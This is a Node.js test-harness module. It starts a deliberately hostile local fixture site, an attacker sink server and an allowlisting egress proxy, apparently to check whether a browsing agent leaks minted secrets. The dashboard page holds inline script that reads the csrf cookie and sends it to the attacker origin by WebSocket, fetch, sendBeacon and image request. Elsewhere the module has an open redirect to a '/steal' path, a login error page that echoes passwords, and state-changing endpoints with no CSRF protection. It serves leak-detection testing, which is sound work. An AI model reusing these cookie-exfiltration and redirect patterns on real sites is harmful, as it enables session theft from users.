// Hostile fixture site, attacker sink and egress proxy for the M0 spike.
// The fixture reports every secret it mints so the harness can scan for them.

const http = require('http');
const crypto = require('crypto');

const rnd = (n) => crypto.randomBytes(n).toString('hex');
const listen = (server) =>
  new Promise((res) => server.listen(0, '127.0.0.1', () => res(server.address().port)));

const page = (title, body, head = '') =>
  `<!doctype html><html><head><meta charset="utf-8"><title>${title}</title>${head}</head><body>${body}</body></html>`;

function readBody(req) {
  return new Promise((res) => {
    let b = '';
    req.on('data', (d) => (b += d));
    req.on('end', () => res(b));
  });
}

async function startFixture({ username, passwords, getAttacker }) {
  const minted = [];
  const state = { mutated: false, deleted: false, wsUpgrades: 0 };
  const sessions = new Map();
  const mint = (name, value, cls) => (minted.push({ name, value, cls }), value);

  const newSession = () => {
    const s = {
      sid: mint('sid_cookie', rnd(16), 'session'),
      csrf: mint('csrf_cookie', rnd(12), 'session'),
      access: mint('storage_access_token', rnd(20), 'session'),
      hint: mint('login_redirect_param', rnd(12), 'session'),
      hidden: mint('hidden_form_token', rnd(12), 'structural'),
    };
    sessions.set(s.sid, s);
    return s;
  };
  const cookiesFor = (s) => [
    `sid=${s.sid}; Path=/; HttpOnly`,
    `csrf=${s.csrf}; Path=/`,
    `theme=darkmode-enabled; Path=/`,
    `lang=en; Path=/`,
  ];
  const sessionOf = (req) => {
    const m = /(?:^|;\s*)sid=([0-9a-f]+)/.exec(req.headers.cookie || '');
    return m && sessions.get(m[1]);
  };
  const html = (res, body, code = 200) => {
    res.writeHead(code, { 'content-type': 'text/html; charset=utf-8' });
    res.end(body);
  };

  const server = http.createServer(async (req, res) => {
    const u = new URL(req.url, 'http://x');
    const ATT = getAttacker();
    const s = sessionOf(req);

    if (u.pathname === '/login' && req.method === 'GET') {
      return html(res, page('Sign in', `
        <h1>Sign in</h1>
        <form method="post" action="/login">
          <input name="username" autocomplete="username" aria-label="Email">
          <input type="password" name="password" id="pw" aria-label="Password">
          <label><input type="checkbox" id="show" onchange="pw.type=this.checked?'text':'password'">Show password</label>
          <button>Sign in</button>
        </form>`));
    }
    if (u.pathname === '/login' && req.method === 'POST') {
      const f = new URLSearchParams(await readBody(req));
      if (f.get('username') === username && f.get('password') === passwords.good) {
        const ns = newSession();
        res.writeHead(302, { 'set-cookie': cookiesFor(ns), location: `/app?hint=${ns.hint}` });
        return res.end();
      }
      // Hostile: echo the submitted password back in the error page.
      return html(res, page('Sign in failed',
        `<h1>Sign in failed</h1><p>Login failed for ${f.get('username')} with password ${f.get('password')}</p>`));
    }
    if (u.pathname === '/spa-login') {
      const mirror = u.searchParams.get('mirror') === '1';
      return html(res, page('Sign in', `
        <h1>Sign in</h1>
        <form id="f">
          <input name="username" aria-label="Email">
          <input type="password" name="password" aria-label="Password">
          <button>Sign in</button>
        </form>
        <script>
          f.addEventListener('submit', async (e) => {
            e.preventDefault();
            const d = new FormData(f); const pw = d.get('password');
            window.__pw = pw; // hostile: keep it in the heap
            const r = await fetch('/api/login', { method: 'POST', body: JSON.stringify({ u: d.get('username'), p: pw }) });
            if (r.ok) document.body.innerHTML = '<div id="welcome">Signed in</div>' + (${mirror} ? '<p>debug: ' + pw + '</p>' : '');
            else document.body.innerHTML = '<p id="err">Nope: ' + pw + '</p>';
          });
        </script>`));
    }
    if (u.pathname === '/api/login' && req.method === 'POST') {
      let j = {};
      try { j = JSON.parse(await readBody(req)); } catch {}
      if (j.u === username && j.p === passwords.good) {
        const ns = newSession();
        res.writeHead(200, { 'set-cookie': cookiesFor(ns), 'content-type': 'application/json' });
        return res.end('{"ok":true}');
      }
      res.writeHead(401);
      return res.end();
    }
    if (u.pathname === '/__minted') { res.writeHead(200); return res.end(JSON.stringify(minted)); }
    if (u.pathname === '/pixel.gif') { res.writeHead(200, { 'content-type': 'image/gif' }); return res.end(); }

    if (!s) { res.writeHead(302, { location: '/login' }); return res.end(); }

    if (u.pathname === '/app') {
      return html(res, page('Dashboard', `
        <h1>Dashboard</h1>
        <p>Welcome back, owner. You have 3 open invoices totalling 1,240.00 EUR.</p>
        <p>Display theme: darkmode-enabled</p>
        <nav>
          <a href="/invoices">Invoices</a>
          <a href="/echo">Session diagnostics</a>
          <a href="/settings/token">API tokens</a>
          <a href="/xss">Preview</a>
          <a href="/mutate">Confirm email</a>
          <a href="/redirect?to=${encodeURIComponent(ATT + '/steal')}">Partner portal</a>
          <a href="/app" target="_blank">Open in new window</a>
        </nav>
        <form action="/search" method="get"><input type="search" name="q" aria-label="Search"><button>Search</button></form>
        <form action="/delete" method="post"><input type="hidden" name="csrf" value="${s.hidden}"><button>Delete project</button></form>
        <script>
          localStorage.setItem('auth', JSON.stringify({ user: 'owner', nested: { access_token: '${s.access}' } }));
          const c = (document.cookie.match(/csrf=([^;]+)/) || [])[1];
          try { new WebSocket('${ATT.replace('http', 'ws')}/ws?c=' + c); } catch (e) {}
          try { new WebSocket('ws://' + location.host + '/ws'); } catch (e) {}
          try { fetch('${ATT}/fetch?c=' + c, { mode: 'no-cors' }).catch(() => {}); } catch (e) {}
          try { navigator.sendBeacon('${ATT}/beacon?c=' + c); } catch (e) {}
          new Image().src = '${ATT}/img?c=' + c;
        </script>`, `<link rel="preconnect" href="${ATT}">`));
    }
    if (u.pathname === '/invoices') {
      return html(res, page('Invoices', `
        <h1>Invoices</h1>
        <table><tr><th>Number</th><th>Customer</th><th>Amount</th></tr>
        <tr><td>INV-1001</td><td>Northwind</td><td>420.00</td></tr>
        <tr><td>INV-1002</td><td>Contoso</td><td>380.00</td></tr>
        <tr><td>INV-1003</td><td>Fabrikam</td><td>440.00</td></tr></table>
        <a href="/app">Back</a>`));
    }
    if (u.pathname === '/search') {
      return html(res, page('Search', `<h1>Search</h1><p>Results for: ${(u.searchParams.get('q') || '').replace(/</g, '&lt;')}</p>
        <form action="/search" method="get"><input type="search" name="q" aria-label="Search" value="${(u.searchParams.get('q') || '').replace(/"/g, '&quot;')}"><button>Search</button></form>
        <a href="/app">Back</a>`));
    }
    if (u.pathname === '/echo') {
      const sid = s.sid;
      return html(res, page(`Diagnostics ${sid}`, `
        <h1>Session diagnostics</h1>
        <p>Your session id is ${sid}.</p>
        <p>Encoded: ${Buffer.from(sid).toString('base64')}</p>
        <p>Hex: ${Buffer.from(sid).toString('hex')}</p>
        <p>Split: <span>${sid.slice(0, 16)}</span><span>${sid.slice(16)}</span></p>
        <p>Half: ${sid.slice(0, 20)}</p>
        <img src="/pixel.gif" alt="token ${sid}">
        <button aria-label="copy ${sid}">Copy</button>
        <a href="/app?sid=${sid}">Continue</a>
        <a href="/app/${sid}/view">Path link</a>
        <input type="hidden" name="sid" value="${sid}">
        <input type="text" aria-label="Session field" value="${sid}">
        <div data-sid="${sid}">Data</div>
        <p id="ls"></p>
        <iframe src="/frame" title="frame"></iframe>
        <div id="host"></div>
        <canvas id="cv" width="400" height="30"></canvas>
        <script>
          host.attachShadow({ mode: 'closed' }).innerHTML = '<p>shadow ${sid}</p>';
          console.log('${sid}');
          ls.textContent = 'storage ' + JSON.parse(localStorage.getItem('auth') || '{"nested":{}}').nested.access_token;
          cv.getContext('2d').fillText('${sid}', 5, 20);
          alert('${sid}');
        </script>`));
    }
    if (u.pathname === '/frame') return html(res, page('frame', `<p>framed ${s.sid}</p>`));
    if (u.pathname === '/settings/token') {
      const t = mint('rendered_api_token', rnd(20), 'rendered');
      return html(res, page('API tokens', `<h1>API tokens</h1><p>Your new API token: ${t}</p><a href="/app">Back</a>`));
    }
    if (u.pathname === '/xss') {
      // Stands in for attacker script already running on an allowed origin.
      return html(res, page('Preview', `<h1>Preview</h1><p id="o"></p><a href="/app">Back</a>
        <script>const c=(document.cookie.match(/csrf=([^;]+)/)||[])[1];
        o.textContent='r:'+c.split('').reverse().join('')+' s:'+c.split('').join(' ');</script>`));
    }
    if (u.pathname === '/mutate') { state.mutated = true; return html(res, page('Confirmed', '<p>Email confirmed.</p><a href="/app">Back</a>')); }
    if (u.pathname === '/delete' && req.method === 'POST') { state.deleted = true; return html(res, page('Deleted', '<p>Project deleted.</p>')); }
    if (u.pathname === '/redirect') { res.writeHead(302, { location: u.searchParams.get('to') }); return res.end(); }
    res.writeHead(404);
    res.end('not found');
  });
  server.on('upgrade', (req, sock) => { state.wsUpgrades++; sock.destroy(); });
  const port = await listen(server);
  return { server, port, minted, state, origin: `http://localhost:${port}`, host: `localhost:${port}` };
}

async function startAttacker() {
  const hits = [];
  const server = http.createServer((req, res) => {
    hits.push({ kind: 'http', url: req.url });
    res.writeHead(200, { 'access-control-allow-origin': '*' });
    res.end('ok');
  });
  server.on('upgrade', (req, sock) => { hits.push({ kind: 'websocket', url: req.url }); sock.destroy(); });
  server.on('connection', () => hits.connections = (hits.connections || 0) + 1);
  const port = await listen(server);
  return { server, port, hits, origin: `http://127.0.0.1:${port}`, host: `127.0.0.1:${port}` };
}

// Forward proxy that only lets allowlisted hosts through. Refuses CONNECT and upgrades.
async function startProxy(allowedHosts) {
  const denied = [];
  const server = http.createServer((req, res) => {
    let u;
    try { u = new URL(req.url); } catch { res.writeHead(400); return res.end(); }
    if (!allowedHosts.has(u.host)) {
      denied.push({ kind: 'http', host: u.host, path: u.pathname });
      res.writeHead(403);
      return res.end();
    }
    const up = http.request(
      { host: u.hostname, port: u.port, path: u.pathname + u.search, method: req.method, headers: req.headers },
      (r) => { res.writeHead(r.statusCode, r.headers); r.pipe(res); });
    up.on('error', () => res.destroy());
    req.pipe(up);
  });
  server.on('connect', (req, sock) => { denied.push({ kind: 'connect', host: req.url }); sock.end('HTTP/1.1 403 Forbidden\r\n\r\n'); });
  server.on('upgrade', (req, sock) => { denied.push({ kind: 'upgrade', host: req.url }); sock.end('HTTP/1.1 403 Forbidden\r\n\r\n'); });
  const port = await listen(server);
  return { server, port, denied };
}

module.exports = { startFixture, startAttacker, startProxy };
